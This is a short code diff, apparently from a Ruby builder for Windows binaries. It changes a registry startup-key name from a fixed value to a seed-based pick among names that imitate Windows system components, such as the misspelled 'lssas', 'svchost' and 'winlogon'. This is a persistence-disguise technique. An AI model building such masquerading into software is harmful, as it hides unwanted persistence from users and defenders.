@@ -313,7 +313,10 @@ class BuildWindows < Build
   end
 
   def reg_start_key(seed)
-    return 'wmiprvse'
+    fake_names = ['wmiprvse', 'lssas', 'dllhost', 'winlogon', 'svchost', 'MSInst', 'WinIME',
+                  'RSSFeed', 'IconDB', 'MSCache', 'IEPrefs', 'EVTvwr', 'TServer', 'SMBAuth',
+                  'DRM', 'Recovery', 'Registry', 'Cookies', 'MSVault', 'MSDiag', 'MSHelp']
+    fake_names[seed.ord % fake_names.size]
   end
 
 end
